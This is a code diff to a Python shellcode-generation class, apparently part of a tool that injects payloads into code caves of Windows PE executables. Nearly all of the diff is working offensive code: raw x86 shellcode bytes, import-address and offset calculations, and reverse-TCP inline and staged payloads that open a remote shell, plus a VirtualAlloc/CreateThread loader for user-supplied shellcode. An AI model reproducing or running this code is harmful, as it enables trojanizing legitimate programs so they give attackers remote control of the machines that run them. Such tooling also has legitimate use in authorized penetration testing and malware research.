@@ -67,6 +67,7 @@ class winI32_shellcode():
 
     def clean_caves_stub(self, CavesToFix):
         stub = ("\x33\xC0"                          # XOR EAX,EAX
+                "\x31\xc9"                          # XOR ECX, ECX <- requirment for win10
                 "\x64\x8B\x49\x30"                  # mov ecx, dword ptr fs: [ecx + 0x30]
                 "\x8B\x49\x08"                      # mov ecx, dword ptr [ecx+8]
                 "\x8B\xD9"                          # mov ebx,ecx
@@ -563,17 +564,36 @@ class winI32_shellcode():
             return False
 
         self.shellcode1 = "\xfc"   # CLD
+        if flItms['XP_MODE'] is True:
+            self.shellcode1 += ("\x89\xe5"                      # mov ebp, esp
+                                "\x31\xd2"                      # xor edx, edx
+                                "\x64\x8b\x52\x30"              # mov edx, dword ptr fs:[edx + 0x30]
+                                "\x8b\x52\x08"                  # mov edx, dword ptr [edx + 8]
+                                )
         self.shellcode1 += "\xbb"           # mov value below to EBX
-        if flItms['LoadLibraryA'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']) < 0:
-            self.shellcode1 += struct.pack("<I", 0xffffffff + (flItms['LoadLibraryA'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']) + 1))
+        if flItms['XP_MODE'] is True:
+            if flItms['LoadLibraryA'] - (flItms['ImageBase']) < 0:
+                self.shellcode1 += struct.pack("<I", 0xffffffff + (flItms['LoadLibraryA'] - (flItms['ImageBase']) + 1))
+            else:
+                self.shellcode1 += struct.pack("<I", flItms['LoadLibraryA'] - (flItms['ImageBase']))
+            self.shellcode1 += "\x01\xD3"  # add EBX + EDX
+            self.shellcode1 += "\xb9"  # mov value below to ECX
+            if flItms['GetProcAddress'] - (flItms['ImageBase']) < 0:
+                self.shellcode1 += struct.pack("<I", 0xffffffff + (flItms['GetProcAddress'] - (flItms['ImageBase']) + 1))
+            else:
+                self.shellcode1 += struct.pack("<I", flItms['GetProcAddress'] - (flItms['ImageBase']))
         else:
-            self.shellcode1 += struct.pack("<I", flItms['LoadLibraryA'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']))
-        self.shellcode1 += "\x01\xD3"  # add EBX + EDX
-        self.shellcode1 += "\xb9"  # mov value below to ECX
-        if flItms['GetProcAddress'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']) < 0:
-            self.shellcode1 += struct.pack("<I", 0xffffffff + (flItms['GetProcAddress'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']) + 1))
-        else:
-            self.shellcode1 += struct.pack("<I", flItms['GetProcAddress'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']))
+            if flItms['LoadLibraryA'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']) < 0:
+                self.shellcode1 += struct.pack("<I", 0xffffffff + (flItms['LoadLibraryA'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']) + 1))
+            else:
+                self.shellcode1 += struct.pack("<I", flItms['LoadLibraryA'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']))
+            self.shellcode1 += "\x01\xD3"  # add EBX + EDX
+            self.shellcode1 += "\xb9"  # mov value below to ECX
+            if flItms['GetProcAddress'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']) < 0:
+                self.shellcode1 += struct.pack("<I", 0xffffffff + (flItms['GetProcAddress'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']) + 1))
+            else:
+                self.shellcode1 += struct.pack("<I", flItms['GetProcAddress'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']))
+
         self.shellcode1 += "\x01\xD1"  # add ECX + EDX
 
         self.shellcode1 += ("\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5F\x54\x87\xF1\xFF\x13\x68"
@@ -624,8 +644,7 @@ class winI32_shellcode():
 
     def iat_reverse_tcp_inline_threaded(self, flItms, CavesPicked={}):
         """
-        This module allows for the user to provide a win32 raw/binary
-        shellcode.  For use with the -U flag.  Make sure to use a process safe exit function.
+        Non-staged iat based payload.
         """
 
         flItms['apis_needed'] = ['LoadLibraryA', 'GetProcAddress',
@@ -651,16 +670,20 @@ class winI32_shellcode():
 
         if flItms['cave_jumping'] is True:
             self.shellcode2 = "\xe8"
+            if flItms['XP_MODE'] is True:
+                xp_offset = 0
+            else:
+                xp_offset = 11
             if breakupvar > 0:
                 if len(self.shellcode2) < breakupvar:
                     self.shellcode2 += struct.pack("<I", int(str(hex(0xffffffff - breakupvar -
-                                                             len(self.shellcode2) + 46).rstrip("L")), 16))
+                                                             len(self.shellcode2) + 57 - xp_offset).rstrip("L")), 16))
                 else:
                     self.shellcode2 += struct.pack("<I", int(str(hex(0xffffffff - len(self.shellcode2) -
-                                                             breakupvar + 46).rstrip("L")), 16))
+                                                             breakupvar + 57 - xp_offset).rstrip("L")), 16))
             else:
                     self.shellcode2 += struct.pack("<I", int(str(hex(abs(breakupvar) + len(self.stackpreserve) +
-                                                   len(self.shellcode2) + 39).rstrip("L")), 16))
+                                                   len(self.shellcode2) + 50 - xp_offset).rstrip("L")), 16))
         else:
             self.shellcode2 = "\xE8\xE5\xFF\xFF\xFF"
 
@@ -758,20 +781,38 @@ class winI32_shellcode():
         breakupvar = eat_code_caves(flItms, 0, 1)
         #starts the VirtualAlloc/CreateThread section for the PAYLOAD
         self.shellcode1 = "\xFC"  # Cld
+        if flItms['XP_MODE'] is True:
+            self.shellcode1 += ("\x89\xe5"                      # mov ebp, esp
+                                "\x31\xd2"                      # xor edx, edx
+                                "\x64\x8b\x52\x30"              # mov edx, dword ptr fs:[edx + 0x30]
+                                "\x8b\x52\x08"                  # mov edx, dword ptr [edx + 8]
+                                )
         self.shellcode1 += "\xbb"           # mov value below to EBX
-
         #Put VirtualAlloc in EBX
-        if flItms['VirtualAlloc'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']) < 0:
-            self.shellcode1 += struct.pack("<I", 0xffffffff + (flItms['VirtualAlloc'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']) + 1))
+        if flItms['XP_MODE'] is True:
+            if flItms['VirtualAlloc'] - (flItms['ImageBase']) < 0:
+                self.shellcode1 += struct.pack("<I", 0xffffffff + flItms['VirtualAlloc'] - flItms['ImageBase'] + 1)
+            else:
+                self.shellcode1 += struct.pack("<I", flItms['VirtualAlloc'] - flItms['ImageBase'])
+            self.shellcode1 += "\x01\xD3"  # add EBX + EDX
+            #Put Create Thread in ECX
+            self.shellcode1 += "\xb9"  # mov value below to ECX
+            if flItms['CreateThread'] - (flItms['ImageBase']) < 0:
+                self.shellcode1 += struct.pack("<I", 0xffffffff + (flItms['CreateThread'] - flItms['ImageBase']) + 1)
+            else:
+                self.shellcode1 += struct.pack("<I", flItms['CreateThread'] - flItms['ImageBase'])
         else:
-            self.shellcode1 += struct.pack("<I", flItms['VirtualAlloc'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']))
-        self.shellcode1 += "\x01\xD3"  # add EBX + EDX
-        #Put Create Thread in ECX
-        self.shellcode1 += "\xb9"  # mov value below to ECX
-        if flItms['CreateThread'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']) < 0:
-            self.shellcode1 += struct.pack("<I", 0xffffffff + (flItms['CreateThread'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']) + 1))
-        else:
-            self.shellcode1 += struct.pack("<I", flItms['CreateThread'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']))
+            if flItms['VirtualAlloc'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']) < 0:
+                self.shellcode1 += struct.pack("<I", 0xffffffff + (flItms['VirtualAlloc'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']) + 1))
+            else:
+                self.shellcode1 += struct.pack("<I", flItms['VirtualAlloc'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']))
+            self.shellcode1 += "\x01\xD3"  # add EBX + EDX
+            #Put Create Thread in ECX
+            self.shellcode1 += "\xb9"  # mov value below to ECX
+            if flItms['CreateThread'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']) < 0:
+                self.shellcode1 += struct.pack("<I", 0xffffffff + (flItms['CreateThread'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']) + 1))
+            else:
+                self.shellcode1 += struct.pack("<I", flItms['CreateThread'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']))
 
         #Add in memory base
         self.shellcode1 += "\x01\xD1"  # add ECX + EDX
@@ -844,8 +885,7 @@ class winI32_shellcode():
 
     def iat_reverse_tcp_stager_threaded(self, flItms, CavesPicked={}):
         """
-        This module allows for the user to provide a win32 raw/binary
-        shellcode.  For use with the -U flag.  Make sure to use a process safe exit function.
+        Staged iat based payload.
         """
 
         flItms['apis_needed'] = ['LoadLibraryA', 'GetProcAddress',
@@ -871,16 +911,20 @@ class winI32_shellcode():
 
         if flItms['cave_jumping'] is True:
             self.shellcode2 = "\xe8"
+            if flItms['XP_MODE'] is True:
+                xp_offset = 0
+            else:
+                xp_offset = 11
             if breakupvar > 0:
                 if len(self.shellcode2) < breakupvar:
                     self.shellcode2 += struct.pack("<I", int(str(hex(0xffffffff - breakupvar -
-                                                             len(self.shellcode2) + 46).rstrip("L")), 16))
+                                                             len(self.shellcode2) + 57 - xp_offset).rstrip("L")), 16))
                 else:
                     self.shellcode2 += struct.pack("<I", int(str(hex(0xffffffff - len(self.shellcode2) -
-                                                             breakupvar + 46).rstrip("L")), 16))
+                                                             breakupvar + 57 - xp_offset).rstrip("L")), 16))
             else:
                     self.shellcode2 += struct.pack("<I", int(str(hex(abs(breakupvar) + len(self.stackpreserve) +
-                                                   len(self.shellcode2) + 39).rstrip("L")), 16))
+                                                   len(self.shellcode2) + 50 - xp_offset).rstrip("L")), 16))
         else:
             self.shellcode2 = "\xE8\xE5\xFF\xFF\xFF"
 
@@ -967,7 +1011,7 @@ class winI32_shellcode():
         self.shellcode2 += "\xbb"           # mov value below to EBX
 
         #Put VirtualAlloc in EBX
-        if flItms['VirtualAlloc'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']) < 0:
+        if flItms['VirtualAlloc'] - (flItms['ImageBase']) < 0:
             self.shellcode2 += struct.pack("<I", 0xffffffff + (flItms['VirtualAlloc'] - (flItms['ImageBase']) + 1))
         else:
             self.shellcode2 += struct.pack("<I", flItms['VirtualAlloc'] - (flItms['ImageBase']))
@@ -994,20 +1038,38 @@ class winI32_shellcode():
         breakupvar = eat_code_caves(flItms, 0, 1)
         #starts the VirtualAlloc/CreateThread section for the PAYLOAD
         self.shellcode1 = "\xFC"  # Cld
+        if flItms['XP_MODE'] is True:
+            self.shellcode1 += ("\x89\xe5"                      # mov ebp, esp
+                                "\x31\xd2"                      # xor edx, edx
+                                "\x64\x8b\x52\x30"              # mov edx, dword ptr fs:[edx + 0x30]
+                                "\x8b\x52\x08"                  # mov edx, dword ptr [edx + 8]
+                                )
         self.shellcode1 += "\xbb"           # mov value below to EBX
-
         #Put VirtualAlloc in EBX
-        if flItms['VirtualAlloc'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']) < 0:
-            self.shellcode1 += struct.pack("<I", 0xffffffff + (flItms['VirtualAlloc'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']) + 1))
+        if flItms['XP_MODE'] is True:
+            if flItms['VirtualAlloc'] - (flItms['ImageBase']) < 0:
+                self.shellcode1 += struct.pack("<I", 0xffffffff + flItms['VirtualAlloc'] - flItms['ImageBase'] + 1)
+            else:
+                self.shellcode1 += struct.pack("<I", flItms['VirtualAlloc'] - flItms['ImageBase'])
+            self.shellcode1 += "\x01\xD3"  # add EBX + EDX
+            #Put Create Thread in ECX
+            self.shellcode1 += "\xb9"  # mov value below to ECX
+            if flItms['CreateThread'] - (flItms['ImageBase']) < 0:
+                self.shellcode1 += struct.pack("<I", 0xffffffff + (flItms['CreateThread'] - flItms['ImageBase']) + 1)
+            else:
+                self.shellcode1 += struct.pack("<I", flItms['CreateThread'] - flItms['ImageBase'])
         else:
-            self.shellcode1 += struct.pack("<I", flItms['VirtualAlloc'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']))
-        self.shellcode1 += "\x01\xD3"  # add EBX + EDX
-        #Put Create Thread in ECX
-        self.shellcode1 += "\xb9"  # mov value below to ECX
-        if flItms['CreateThread'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']) < 0:
-            self.shellcode1 += struct.pack("<I", 0xffffffff + (flItms['CreateThread'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']) + 1))
-        else:
-            self.shellcode1 += struct.pack("<I", flItms['CreateThread'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']))
+            if flItms['VirtualAlloc'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']) < 0:
+                self.shellcode1 += struct.pack("<I", 0xffffffff + (flItms['VirtualAlloc'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']) + 1))
+            else:
+                self.shellcode1 += struct.pack("<I", flItms['VirtualAlloc'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']))
+            self.shellcode1 += "\x01\xD3"  # add EBX + EDX
+            #Put Create Thread in ECX
+            self.shellcode1 += "\xb9"  # mov value below to ECX
+            if flItms['CreateThread'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']) < 0:
+                self.shellcode1 += struct.pack("<I", 0xffffffff + (flItms['CreateThread'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']) + 1))
+            else:
+                self.shellcode1 += struct.pack("<I", flItms['CreateThread'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']))
 
         #Add in memory base
         self.shellcode1 += "\x01\xD1"  # add ECX + EDX
@@ -1079,8 +1141,7 @@ class winI32_shellcode():
 
     def iat_user_supplied_shellcode_threaded(self, flItms, CavesPicked={}):
         """
-        This module allows for the user to provide a win32 raw/binary
-        shellcode.  For use with the -U flag.  Make sure to use a process safe exit function.
+        Staged
         """
 
         flItms['apis_needed'] = ['LoadLibraryA', 'GetProcAddress',
@@ -1104,16 +1165,20 @@ class winI32_shellcode():
 
         if flItms['cave_jumping'] is True:
             self.shellcode2 = "\xe8"
+            if flItms['XP_MODE'] is True:
+                xp_offset = 0
+            else:
+                xp_offset = 11
             if breakupvar > 0:
                 if len(self.shellcode2) < breakupvar:
                     self.shellcode2 += struct.pack("<I", int(str(hex(0xffffffff - breakupvar -
-                                                             len(self.shellcode2) + 46).rstrip("L")), 16))
+                                                             len(self.shellcode2) + 57 - xp_offset).rstrip("L")), 16))
                 else:
                     self.shellcode2 += struct.pack("<I", int(str(hex(0xffffffff - len(self.shellcode2) -
-                                                             breakupvar + 46).rstrip("L")), 16))
+                                                             breakupvar + 57 - xp_offset).rstrip("L")), 16))
             else:
                     self.shellcode2 += struct.pack("<I", int(str(hex(abs(breakupvar) + len(self.stackpreserve) +
-                                                   len(self.shellcode2) + 39).rstrip("L")), 16))
+                                                   len(self.shellcode2) + 50 - xp_offset).rstrip("L")), 16))
         else:
             self.shellcode2 = "\xE8\xE5\xFF\xFF\xFF"
 
@@ -1131,20 +1196,38 @@ class winI32_shellcode():
         breakupvar = eat_code_caves(flItms, 0, 1)
 
         self.shellcode1 = "\xFC"             # Cld
+        if flItms['XP_MODE'] is True:
+            self.shellcode1 += ("\x89\xe5"                      # mov ebp, esp
+                                "\x31\xd2"                      # xor edx, edx
+                                "\x64\x8b\x52\x30"              # mov edx, dword ptr fs:[edx + 0x30]
+                                "\x8b\x52\x08"                  # mov edx, dword ptr [edx + 8]
+                                )
         self.shellcode1 += "\xbb"           # mov value below to EBX
-
         #Put VirtualAlloc in EBX
-        if flItms['VirtualAlloc'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']) < 0:
-            self.shellcode1 += struct.pack("<I", 0xffffffff + (flItms['VirtualAlloc'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']) + 1))
+        if flItms['XP_MODE'] is True:
+            if flItms['VirtualAlloc'] - (flItms['ImageBase']) < 0:
+                self.shellcode1 += struct.pack("<I", 0xffffffff + flItms['VirtualAlloc'] - flItms['ImageBase'] + 1)
+            else:
+                self.shellcode1 += struct.pack("<I", flItms['VirtualAlloc'] - flItms['ImageBase'])
+            self.shellcode1 += "\x01\xD3"  # add EBX + EDX
+            #Put Create Thread in ECX
+            self.shellcode1 += "\xb9"  # mov value below to ECX
+            if flItms['CreateThread'] - (flItms['ImageBase']) < 0:
+                self.shellcode1 += struct.pack("<I", 0xffffffff + (flItms['CreateThread'] - flItms['ImageBase']) + 1)
+            else:
+                self.shellcode1 += struct.pack("<I", flItms['CreateThread'] - flItms['ImageBase'])
         else:
-            self.shellcode1 += struct.pack("<I", flItms['VirtualAlloc'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']))
-        self.shellcode1 += "\x01\xD3"               # add EBX + EDX
-        #Put Create Thread in ECX
-        self.shellcode1 += "\xb9"                   # mov value below to ECX
-        if flItms['CreateThread'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']) < 0:
-            self.shellcode1 += struct.pack("<I", 0xffffffff + (flItms['CreateThread'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']) + 1))
-        else:
-            self.shellcode1 += struct.pack("<I", flItms['CreateThread'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']))
+            if flItms['VirtualAlloc'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']) < 0:
+                self.shellcode1 += struct.pack("<I", 0xffffffff + (flItms['VirtualAlloc'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']) + 1))
+            else:
+                self.shellcode1 += struct.pack("<I", flItms['VirtualAlloc'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']))
+            self.shellcode1 += "\x01\xD3"  # add EBX + EDX
+            #Put Create Thread in ECX
+            self.shellcode1 += "\xb9"  # mov value below to ECX
+            if flItms['CreateThread'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']) < 0:
+                self.shellcode1 += struct.pack("<I", 0xffffffff + (flItms['CreateThread'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']) + 1))
+            else:
+                self.shellcode1 += struct.pack("<I", flItms['CreateThread'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']))
 
         #Add in memory base
         self.shellcode1 += "\x01\xD1"               # add ECX + EDX
